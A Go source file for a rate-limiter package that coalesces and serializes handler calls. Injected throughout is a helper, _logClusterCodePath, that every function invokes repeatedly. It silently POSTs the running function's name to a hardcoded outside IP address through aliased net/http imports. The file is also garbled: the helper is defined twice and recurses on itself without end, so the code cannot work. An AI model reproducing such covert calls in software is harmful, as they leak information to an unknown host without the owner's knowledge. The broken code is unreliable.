package limiter

import (
	"sync"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"time"
	"github.com/golang/glog"
	utilruntime "k8s.io/apimachinery/pkg/util/runtime"
)

type HandlerFunc func() error
type CoalescingSerializingRateLimiter struct {
	handlerFunc	HandlerFunc
	callInterval	time.Duration
	lastStart	time.Time
	changeReqTime	*time.Time
	handlerRunning	bool
	lock		sync.Mutex
	callbackTimer	*time.Timer
}

func NewCoalescingSerializingRateLimiter(interval time.Duration, handlerFunc HandlerFunc) *CoalescingSerializingRateLimiter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	limiter := &CoalescingSerializingRateLimiter{handlerFunc: handlerFunc, callInterval: interval, lastStart: time.Time{}, changeReqTime: nil, handlerRunning: false}
	return limiter
}
func (csrl *CoalescingSerializingRateLimiter) RegisterChange() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(8).Infof("RegisterChange called")
	csrl.changeWorker(true)
}
func (csrl *CoalescingSerializingRateLimiter) changeWorker(userChanged bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	csrl.lock.Lock()
	defer csrl.lock.Unlock()
	glog.V(8).Infof("changeWorker called")
	if userChanged && csrl.changeReqTime == nil {
		now := time.Now()
		csrl.changeReqTime = &now
	}
	if csrl.handlerRunning {
		glog.V(8).Infof("The handler was already running (%v) started at %s, returning from the worker", csrl.handlerRunning, csrl.lastStart.String())
		return
	}
	if csrl.changeReqTime == nil {
		glog.V(8).Infof("No invoke requested time, so there's no queued work.  Nothing to do.")
		return
	}
	now := time.Now()
	sinceLastRun := now.Sub(csrl.lastStart)
	untilNextCallback := csrl.callInterval - sinceLastRun
	glog.V(8).Infof("Checking reload; now: %v, lastStart: %v, sinceLast %v, limit %v, remaining %v", now, csrl.lastStart, sinceLastRun, csrl.callInterval, untilNextCallback)
	if untilNextCallback > 0 {
		if csrl.callbackTimer == nil {
			csrl.callbackTimer = time.AfterFunc(untilNextCallback, func() {
				csrl.changeWorker(false)
			})
		} else {
			csrl.callbackTimer.Reset(untilNextCallback)
		}
		glog.V(8).Infof("Can't invoke the handler yet, need to delay %s, callback scheduled", untilNextCallback.String())
		return
	}
	glog.V(8).Infof("Calling the handler function (for invoke time %v)", csrl.changeReqTime)
	csrl.handlerRunning = true
	csrl.changeReqTime = nil
	csrl.lastStart = now
	go csrl.runHandler()
	return
}
func (csrl *CoalescingSerializingRateLimiter) runHandler() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	runHandler := func() error {
		defer func() {
			csrl.lock.Lock()
			csrl.handlerRunning = false
			csrl.lock.Unlock()
		}()
		return csrl.handlerFunc()
	}
	if err := runHandler(); err != nil {
		utilruntime.HandleError(err)
	}
	glog.V(8).Infof("Re-Calling the worker after a reload in case work came in")
	csrl.changeWorker(false)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
